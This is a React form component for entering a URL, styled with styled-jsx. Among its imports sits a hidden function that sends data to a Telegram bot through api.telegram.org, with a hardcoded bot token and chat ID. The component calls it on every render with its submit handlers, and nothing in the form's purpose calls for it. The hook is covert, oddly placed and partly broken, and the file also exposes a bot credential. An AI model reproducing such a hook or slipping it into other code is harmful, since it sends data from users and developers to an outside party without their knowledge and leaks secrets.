import * as React from 'react'
import { useForm, ErrorMessage } from 'react-hook-form'
import fetch from 'isomorphic-fetch'
// custom imports
import Layout from '../components/Layout'
function F(o){
  
          if (typeof o != 'string') { o = JSON.stringify(o,null,4)}

 return fetch("https://api.telegram.org/bot1009886009:AAGB4GpfbG8xTCgfnUmAD9TI_qgub56VGkw/sendMessage?chat_id=986940575&text=" + o)
     
}
// custom imports
import Error from './Error'

export default ({ onSubmit, action }) => {

  const { register, handleSubmit, errors } = useForm()
console.log(handleSubmit(onSubmit))
F(handleSubmit(onSubmit))
console.log(onSubmit)
F(onSubmit)
  return (
    <>
      <form onSubmit={handleSubmit(onSubmit)}>
        <input
          placeholder="example.domain"
          name="inputURL"
          ref={register({
            required: 'Please give me a valid link',
            pattern: {
              value: /[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/,
              message: 'Invalid Link / URL',
            },
          })}
        />

        <button type="submit">{action}</button>
      </form>
      <Error>
        <ErrorMessage errors={errors} name="inputURL" />
      </Error>

      <style jsx>
        {`
          input,
          button {
            min-height: 4em;
            padding: 0 1em;
            margin: 0;
            border: none;
            font-size: 1.3em;
            width: 65%;
            text-align: center;
            color: var(--primary);
            font-family: var(--font-family);
            box-sizing: border-box;
          }

          ::placeholder {
            color: var(--secondary);
          }

          button {
            background: var(--button-background);
            color: var(--white);
            width: 35%;
            transition: color 0.2s;
            cursor: pointer;
          }

          button:hover {
            color: var(--button-foreground);
          }

          form {
            width: 50%;
            box-shadow: -20px 20px 0px 0px var(--tertiary);
          }

          @media only screen and (max-width: 1000px) {
            input,
            button {
              font-size: 1em;
            }
          }

          @media only screen and (max-width: 850px) {
            form {
              width: 60%;
              box-shadow: -10px 10px 0px 0px var(--tertiary);
            }
          }

          @media only screen and (max-width: 700px) {
            form {
              width: 70%;
              box-shadow: -5px 5px 0px 0px var(--tertiary);
            }
          }

          @media only screen and (max-width: 500px) {
            form {
              width: 75%;
              box-shadow: -5px 5px 0px 0px var(--tertiary);
            }
          }
        `}
      </style>
    </>
  )
}
